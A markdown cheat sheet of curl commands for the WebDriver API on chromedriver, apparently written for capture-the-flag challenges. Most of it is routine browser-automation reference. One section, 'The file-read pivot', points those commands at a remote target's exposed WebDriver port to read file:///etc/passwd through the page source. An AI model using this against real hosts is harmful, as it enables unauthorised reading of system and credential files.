# WebDriver API — endpoint cheat sheet for `curl`

## Session lifecycle

```bash
# create a session
curl -s -X POST http://localhost:9515/session \
  -H 'Content-Type: application/json' \
  -d '{"capabilities":{"alwaysMatch":{"browserName":"chrome"}}}'
# -> {"value":{"sessionId":"abc123","capabilities":{...}}}

# destroy it
curl -s -X DELETE http://localhost:9515/session/abc123
```

The sessionId from creation is used in every later command path. A
leaked session holds a browser process open — always delete it.

## Navigation

```bash
# go to a URL
curl -s -X POST http://localhost:9515/session/$S/url \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://target/"}'

# current URL
curl -s http://localhost:9515/session/$S/url
# -> {"value":"http://target/"}

# back / forward / refresh
curl -s -X POST http://localhost:9515/session/$S/back   -d '{}'
curl -s -X POST http://localhost:9515/session/$S/forward -d '{}'
curl -s -X POST http://localhost:9515/session/$S/refresh -d '{}'
```

## Reading the page

```bash
# rendered DOM
curl -s http://localhost:9515/session/$S/source

# page title
curl -s http://localhost:9515/session/$S/title

# a screenshot (base64 PNG)
curl -s http://localhost:9515/session/$S/screenshot | python3 -c 'import sys,json,base64;open("shot.png","wb").write(base64.b64decode(json.load(sys.stdin)["value"]))'
```

## Running JavaScript

```bash
# synchronous script — the workhorse
curl -s -X POST http://localhost:9515/session/$S/execute/sync \
  -H 'Content-Type: application/json' \
  -d '{"script":"return document.body.innerText","args":[]}'
# -> {"value":"...the text..."}

# async script — call arguments[arguments.length-1] when done
curl -s -X POST http://localhost:9515/session/$S/execute/async \
  -H 'Content-Type: application/json' \
  -d '{"script":"var d=arguments[0];fetch(\"/api/me\").then(r=>r.text()).then(d)","args":[]}'
```

`execute/sync` returns the script's `return` value serialised to JSON.
`execute/async` blocks until the last argument (the callback) is
invoked — use it for fetches, timers, and anything asynchronous.

## Console / errors

```bash
# capture a console message by injecting a hook first
curl -s -X POST http://localhost:9515/session/$S/execute/sync \
  -H 'Content-Type: application/json' \
  -d '{"script":"window.__errs=[];window.onerror=function(m){__errs.push(m)};console.error=(m)=>__errs.push(m);return true","args":[]}'

# then read it back after the payload runs
curl -s -X POST http://localhost:9515/session/$S/execute/sync \
  -H 'Content-Type: application/json' \
  -d '{"script":"return window.__errs","args":[]}'
```

## Cookies

```bash
# all cookies for the current page
curl -s http://localhost:9515/session/$S/cookies

# set one
curl -s -X POST http://localhost:9515/session/$S/cookies \
  -H 'Content-Type: application/json' \
  -d '{"cookie":{"name":"session","value":"abc","path":"/"}}'

# delete one / all
curl -s -X DELETE http://localhost:9515/session/$S/cookies/session
curl -s -X DELETE http://localhost:9515/session/$S/cookies
```

## Element interaction

```bash
# find an element (returns a web element reference)
curl -s -X POST http://localhost:9515/session/$S/element \
  -H 'Content-Type: application/json' \
  -d '{"using":"css selector","value":"#submit"}'
# -> {"value":{"element-6066-11e4-a52e-4f735466cecf":"e1"}}

# click / type / read
curl -s -X POST http://localhost:9515/session/$S/element/e1/click -d '{}'
curl -s -X POST http://localhost:9515/session/$S/element/e1/value \
  -H 'Content-Type: application/json' -d '{"text":"hello"}'
curl -s http://localhost:9515/session/$S/element/e1/text

# all matching elements
curl -s -X POST http://localhost:9515/session/$S/elements \
  -H 'Content-Type: application/json' -d '{"using":"css selector","value":"input"}'
```

## Timeouts and window

```bash
curl -s -X POST http://localhost:9515/session/$S/timeouts \
  -H 'Content-Type: application/json' \
  -d '{"script":30000,"pageLoad":30000,"implicit":5000}'

curl -s -X POST http://localhost:9515/session/$S/window/rect \
  -H 'Content-Type: application/json' -d '{"width":1280,"height":800}'
```

## The file-read pivot (attack surface)

```bash
curl -s -X POST http://TARGET:9515/session/$S/url \
  -H 'Content-Type: application/json' \
  -d '{"url":"file:///etc/passwd"}'
curl -s http://TARGET:9515/session/$S/source
```

The page source of a `file://` navigation is the file's contents. Same
command as any navigation — turned at the target.

## Capabilities worth knowing

```json
{"capabilities":{"alwaysMatch":{
  "browserName":"chrome",
  "goog:chromeOptions":{
    "args":["--headless=new","--no-sandbox","--disable-gpu","--disable-dev-shm-usage"],
    "binary":"/usr/bin/chromium"
  }
}}}
```

`goog:chromeOptions.args` passes Chrome flags. `binary` selects a
non-default browser binary. Both matter when the challenge's bot runs
specific flags you must reproduce.
